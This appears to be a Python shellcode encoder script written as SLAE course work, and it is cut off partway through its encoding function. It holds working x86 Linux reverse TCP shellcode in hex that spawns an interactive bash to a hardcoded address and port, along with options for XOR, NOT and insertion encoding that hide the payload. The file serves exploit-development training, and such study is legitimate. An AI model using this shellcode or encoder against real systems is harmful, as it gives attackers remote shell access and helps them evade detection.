#!/usr/bin/env python

#-----------------------------------------------------------------------------
#
# encoder.py
# by Michael Born (@blu3gl0w13)
# Student-ID: SLAE-744
# September 5, 2016
#
#----------------------------------------------------------------------------


# handle our imports

import sys
import argparse



parser = argparse.ArgumentParser(description='Custom shell script encoder')

shelltype = parser.add_mutually_exclusive_group()
shelltype.add_argument('-r', '--reverse', help='Reverse TCP shell', action='store', dest='revshell')
shelltype.add_argument('-b', '--bind', help='Bind TCP shell', action='store', dest='bindshell')

encoder = parser.add_mutually_exclusive_group()
encoder.add_argument('-x', '--xor', help='XOR Encoder', action='store_true', dest='xorEncoder')
encoder.add_argument('-n', '--not', help='NOT Encoder', action='store_true', dest='notEncoder')
encoder.add_argument('-i', '--insert', help='Insertion Encoder', action='store_true', dest='insertEncoder')
encoder.add_argument('-j', '--jedi', help='Jedi Encoder', action='store_true', dest='jediEncoder')
encoder.add_argument('-a', '--all', help='XOR, NOT, and Insertion Encoders', action='store_true',  dest='allEncoder')





# TCP Bind interactive shell
# 
#
#
#




# reverse TCP interactive shell
# IP 192.168.250.129
# PORT 4444
# Bad Characters 0x00
#
# use iptohex.py
# to get the shellcode
# for IP and PORT below





ipaddr = "\xc0\xa8\xfa\x81" 
port = "\x11\x5c"


shellcode = ""
shellcode += "\x31\xc0\x31\xdb\x6a\x06\x6a\x01\x6a\x02\xb0\x66\xb3\x01\x89\xe1\xcd\x80\x89\xc7\xeb\x5b\x5e\x31"
shellcode += "\xc0\x31\xc9\xff\x36\x66\xff\x76\x04\xb0\x02\x66\x50\x89\xe0\x6a\x10\x50\x57\x31\xc0\xb0\x66\x31"
shellcode += "\xdb\xb3\x03\x89\xe1\xcd\x80\x31\xdb\x31\xc9\x89\xfb\xb0\x3f\xcd\x80\x41\xb0\x3f\xcd\x80\x41\xb0"
shellcode += "\x3f\xcd\x80\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x2f\x2f\x2f\x2f\x68\x2f\x62\x69\x6e\x89\xe3\x50"
shellcode += "\x66\x68\x2d\x69\x89\xe6\x50\x56\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80\xe8\xa0\xff\xff\xff"

shellcode += ipaddr
shellcode += port



def encoder(shellcode):

  for i in bytearray(shellcode):
    
